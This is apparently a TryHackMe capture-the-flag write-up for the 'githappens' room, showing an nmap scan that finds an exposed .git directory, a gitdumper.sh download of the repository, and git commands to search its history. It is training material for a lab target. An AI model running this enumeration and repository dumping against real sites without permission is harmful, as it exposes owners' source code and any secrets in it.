# Room
https://tryhackme.com/room/githappens

# Task 1 - Capture the flag
* Enumeration - nmap
    ```
    nmap -A -T4 10.10.19.107 | tee nmap.txt
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-22 18:39 EST
    Nmap scan report for 10.10.19.107
    Host is up (0.25s latency).
    Not shown: 999 closed ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    nginx 1.14.0 (Ubuntu)
    | http-git: 
    |   10.10.19.107:80/.git/
    |     Git repository found!
    |_    Repository description: Unnamed repository; edit this file 'description' to name the...
    |_http-server-header: nginx/1.14.0 (Ubuntu)
    |_http-title: Super Awesome Site!
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 28.95 seconds
    ```
* Download the site
    ```
    ./gitdumper.sh http://10.10.19.107/.git/ dump                              
    ###########                                                                                 
    # GitDumper is part of https://github.com/internetwache/GitTools                            
    #                                                                                           
    # Developed and maintained by @gehaxelt from @internetwache                                 
    #                                                                                           
    # Use at your own risk. Usage might be illegal in certain circumstances.                    
    # Only for educational purposes!                                                            
    ###########                                                                                 
                                                                                                
                                                                                                
    [*] Destination folder does not exist                                                       
    [+] Creating dump/.git/                                                                     
    [+] Downloaded: HEAD                                                                        
    [-] Downloaded: objects/info/packs                                                          
    [+] Downloaded: description                                                                 
    [+] Downloaded: config                                                                      
    [-] Downloaded: COMMIT_EDITMSG                                                              
    [+] Downloaded: index                                                                       
    [+] Downloaded: packed-refs                                                                 
    [+] Downloaded: refs/heads/master                                                           
    [-] Downloaded: refs/remotes/origin/HEAD                                       
    ```
* Search commits
    ```
    git log
    ```
* Show code
    ```
    git show hash_here
    ```